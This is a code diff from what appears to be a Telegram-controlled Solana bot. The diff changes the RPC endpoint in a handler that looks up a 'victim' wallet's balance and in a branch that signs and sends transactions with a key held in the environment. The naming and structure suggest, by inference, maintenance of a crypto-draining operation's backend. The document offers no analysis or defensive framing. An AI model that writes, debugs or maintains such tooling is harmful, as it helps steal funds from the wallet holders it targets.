@@ -52,7 +52,8 @@ export default {
           // 2. CHECK BALANCE BUTTON
           if (data.startsWith("balance:")) {
             const victimAddress = data.split(":")[1];
-            const connection = new Connection("https://solana.publicnode.com", "confirmed");
+            // RPC GEAENDERT
+            const connection = new Connection("https://api.mainnet-beta.solana.com", "confirmed");
             const victimPubkey = new PublicKey(victimAddress);
             
             const solBalance = await connection.getBalance(victimPubkey);
@@ -74,7 +75,8 @@ export default {
             });
 
             try {
-              const connection = new Connection("https://solana.publicnode.com", "confirmed");
+              // RPC GEAENDERT
+              const connection = new Connection("https://api.mainnet-beta.solana.com", "confirmed");
               const privateKeyArray = bs58.decode(env.PRIVATE_KEY);
               const payer = Keypair.fromSecretKey(privateKeyArray);
               
@@ -102,7 +104,6 @@ export default {
                 )
               );
 
-              // FEHLER BEHOBEN: Kein "Content" mehr
               const signature = await sendAndConfirmTransaction(connection, tx, [payer]);
 
               await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/sendMessage`, {
